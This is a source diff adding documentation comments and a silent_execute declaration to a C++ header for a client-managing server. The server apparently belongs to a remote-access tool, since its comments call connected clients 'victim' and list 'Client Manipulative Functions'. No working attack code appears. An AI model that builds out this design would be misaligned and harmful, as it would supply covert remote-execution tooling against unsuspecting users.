@@ -2,6 +2,7 @@
 #include "..\Library\precompile.h"
 #include "..\Library\pipe.h"
 #include "..\Server\pod_holder.h"
+
 inline std::ostream& operator<<(std::ostream& os, const WSA_ERROR& error)
 {
 	return (error.code == 0 && error.msg.empty())
@@ -242,20 +243,37 @@ private:
 	/// Checks a given container whether it contains a certain item. 
 	/// </summary>
 	/// <param name="list">the stl container that is suppsed to contain the item</param>
-	/// <param name="item"></param>
-	/// <returns>A vector iterator to the found item or end() iterator if it did not found anything</returns>
+	/// <param name="item">the item to check for</param>
+	/// <returns>If the item consists in container (Bool)</returns>
 	template<typename Container, typename Item>
 	typename bool consists(Container& list, Item item) {
 		return std::find(list.begin(), list.end(), item) != list.end();
 	}
 
+	/// <summary>
+	/// Wrapper for consists(), if client is sill in client_list
+	/// </summary>
+	/// <param name="c">The input client</param>
+	/// <returns>If client is still connected</returns>
 	bool is_connected(client c);
 
+	/// <summary>
+	/// Checks if client has been properly setup, if some of the crucial elemements are missing
+	/// </summary>
+	/// <param name="c">The client to be checked</param>
+	/// <returns>If the client is vaild (Bool)</returns>
 	bool valid_client(client);
 
 	// Client Manipulative Functions
 
+	/// <summary>
+	/// Two part function to either request information from input client or fetch the requested information
+	/// </summary>
+	/// <param name="victim">Input client</param>
+	/// <param name="fetch">Enum that tells if it should request or fetch</param>
+	/// <returns>If the function succeeds (Bool)</returns>
 	bool info(client&, action);
 
+	bool silent_execute(std::string);
 
 };
